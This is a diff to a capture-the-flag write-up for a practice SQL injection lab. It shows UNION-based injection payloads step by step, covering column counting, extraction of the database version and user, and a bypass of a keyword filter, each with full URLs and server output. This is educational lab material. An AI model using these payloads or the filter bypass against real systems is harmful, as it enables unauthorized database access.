@@ -67,24 +67,24 @@ Start:
 > Nothing to show.
 
 => It shows nothing. That means it can be take string instead of integer, so we have to add `'` into our payload:  
-***PAYLOAD***: `4 AND 1=2%27 UNION SELECT 1,2,3--`  
+***PAYLOAD***: `4 AND 1=2' UNION SELECT 1,2,3--`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3--`
 > You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
 
 => OK, so we have problem with `apostrophe (')`  
-***PAYLOAD***: `4 AND 1=2%27 UNION SELECT 1,2,3--'`  
+***PAYLOAD***: `4 AND 1=2' UNION SELECT 1,2,3--'`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3--%27`
 > The used SELECT statements have a different number of columns
 
 => It is ok now, but we have select wrong number of columns:  
-***PAYLOAD***: `4 AND 1=2%27 UNION SELECT 1,2,3,4--'`  
+***PAYLOAD***: `4 AND 1=2' UNION SELECT 1,2,3,4--'`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3,4--%27`
 > - **User-ID:** 1
 > - **Username:** 2
 > - **Age:** 3
 
 => It is Done. Let's grep the *version()* & *user()*:  
-***PAYLOAD***: `4 AND 1=2%27 UNION SELECT version(),user(),3,4--'`  
+***PAYLOAD***: `4 AND 1=2' UNION SELECT version(),user(),3,4--'`  
 ##### Result: #####  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
 > - **User-ID:** 5.6.33-log
@@ -104,17 +104,44 @@ Start:
 > - **Seller:** Team Digi7al
 
 => Test with prev Payload:  
-***PAYLOAD***: `3 AND 1=2%27 UNION SELECT version(),user(),3,4--'`  
+***PAYLOAD***: `3 AND 1=2' UNION SELECT version(),user(),3,4--'`  
 `https://zixem.altervista.org/SQLi/level3.php?item=3%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
 > You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uni select version(),user(),3,4--''' at line 1
 
 => The error message tells us that the statement is being interpreted as `"uni select version(),user(),3,4--''"`, which means that the `on` of union is being filtered out. To combat this, we can add another `on`, so that even after it is removed, the statement still reads union:  
-***PAYLOAD***: `3 AND 1=2%27 UNIONON SELECT version(),user(),3,4--'`  
+***PAYLOAD***: `3 AND 1=2' UNIONON SELECT version(),user(),3,4--'`  
 ##### Result: #####  
 `https://zixem.altervista.org/SQLi/level3.php?item=3%20AND%201=2%27%20UNIONON%20SELECT%20version(),user(),3,4--%27`
 > - **ItemID:** 5.6.33-log
 > - **Item Name:** zixem@localhost
 > - **Seller:** 3
+
+**Bazinga!**  
+###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
+
+===========================================================================================================  
+
+## [Level 4](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-4)
+Start:  
+`[https://zixem.altervista.org/SQLi/level4.php?ebookid=7](https://zixem.altervista.org/SQLi/level4.php?ebookid=7)`  
+> - **eBook ID:**   7
+> - **Name:**       Secrets of Web
+> - **Writer:**     Team Digi7al
+> - **Price:**      40$
+
+=> Test with prev Payload:  
+***PAYLOAD***: `7 AND 1=2' UNION SELECT version(),user(),3,4--'`  
+`https://zixem.altervista.org/SQLi/level4.php?ebookid=7%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
+> The used SELECT statements have a different number of columns.
+
+=> Let's add more column:  
+***PAYLOAD***: `7 AND 1=2' UNION SELECT version(),user(),3,4,5--'`  
+##### Result: #####  
+`https://zixem.altervista.org/SQLi/level4.php?ebookid=7%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4,5--%27`
+> - **eBook ID:**   5.6.33-log
+> - **Name:**       3
+> - **Writer:**     4
+> - **Price:**      zixem@localhost$
 
 **Bazinga!**  
 ###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
